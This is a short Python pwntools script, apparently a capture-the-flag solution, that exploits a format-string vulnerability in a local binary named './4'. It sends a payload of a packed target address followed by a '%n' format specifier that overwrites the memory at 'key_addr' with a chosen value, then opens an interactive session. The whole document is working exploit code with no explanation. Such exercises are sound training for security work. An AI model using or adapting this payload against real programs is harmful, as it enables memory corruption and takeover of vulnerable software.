from pwn import *

p = process("./4")
key_addr = 0x0804A048
payload = p32(key_addr)+"%35795746c%12$n" 
p.sendline(payload)
print(payload)
p.interactive()
